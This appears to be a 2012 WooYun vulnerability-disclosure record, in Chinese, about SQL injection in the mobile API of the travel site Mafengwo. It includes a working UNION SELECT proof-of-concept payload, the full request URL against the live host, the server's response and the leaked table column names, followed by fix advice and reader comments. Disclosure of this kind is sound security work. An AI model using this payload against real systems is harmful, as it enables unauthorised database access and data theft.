{"id": 21049, "wybug_id": "wooyun-2012-04324", "wybug_title": "蚂蜂窝手机应用背后的HTTP API接口存在SQL注入漏洞", "wybug_corp": "蚂蜂窝", "wybug_author": "horseluke", "wybug_date": "2012-02-08 15:35", "wybug_open_date": "2012-03-24 15:36", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "客户端程序设计错误", "客户端安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-02-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-03-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 蚂蜂窝手机应用背后的HTTP API接口存在SQL注入漏洞。同时在这里，非常严肃非常严肃地提醒所有手机应用的开发者，在开发对应的与服务器通讯的API接口时，不要认为加密数据传输就能安全大吉、对参数不加验证就使用！ 详细说明：  蚂蜂窝有几个手机应用，其中之一为旅行家游记。通过反编译apk，发现其与服务器的HTTP API通讯接口：http://www.mafengwo.cn/mobile/travelnotes/gettravels.php虽然通讯过程采取了加密数据传输，但很容易模拟；其中通讯参数travels_id未经验证即进入SQL查询，导致SQL注入产生。   漏洞证明：  1、POC：travels_id为“778079 and 1=2 union select 0,char(97,98,97,98,97,97,97,98,98,98,97,99,97),0,0,0,0,0,0,0,0,0,0--”（不含双引号）时的URL：\nhttp://www.mafengwo.cn/mobile/travelnotes/gettravels.php?r=%7B%22sign%22%3A%22f7c8542ddf4533a09874d4f829123049%22%2C%22data%22%3A%7B%22travels_id%22%3A%22778079+and+1%3D2+union+select+0%2Cchar%2897%2C98%2C97%2C98%2C97%2C97%2C97%2C98%2C98%2C98%2C97%2C99%2C97%29%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0%2C0--%22%2C%22device_id%22%3A%22a984355c5vt74g%22%7D%7D\n返回：\n{\"data\":{\"ret\":1,\"message\":{\"id\":\"ababaaabbbaca\",\"content\":\"0\",\"img_width\":320,\"img_list\":[]}},\"sign\":\"82b60326ab8a7bd4eb43912d371b34d0\"}\n2、证明注入问题存在证据：表travelguide_book含如下列：id,p_mddid,mddid,name,p_mdd_name,mdd_name,icon,icon_big,ver,type,fee,product_id,file,size,password,publish,download,ob,ctime,lasttime   修复方案：  检查所有API接口，是否存在未检查参数等（在普通页面已执行但API层未执行的安全措施）的漏洞。其余建议见“问题描述”。另外给数个漏洞外的建议：（1）请关闭服务器的错误显示（2）请尽快升级用户系统，原因和CSDN历史问题相似   版权声明：转载请注明来源 horseluke@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝 漏洞Rank：8 (WooYun评价)  ", "replys": "漏洞评价：\n评论\n     2012-02-10 18:38 |    \t\tsaga \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | 世界上只有10种人，懂二进制的，和不懂二进...)\t\t \n  这个貌似有点意思·    \n     2012-02-10 18:39 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @saga 加了精华了    \n     2012-03-25 16:09 |    \t\thorseluke \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:18        | Realize the dream in earnest.)\t\t \n  update：厂商已修复该API问题。    \n     2012-07-03 08:56 |    \t\tzidane \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 噢 乖，你们应该明白 这样下去对我们谁都不...)\t\t \n  移动终端上面现在得有多少问题啊    \n  \n\n\n", "wybug_level_fromcorp": "未能联系到厂商或者厂商积极拒绝", "wybug_rank_fromcorp": 8, "Ranks": null}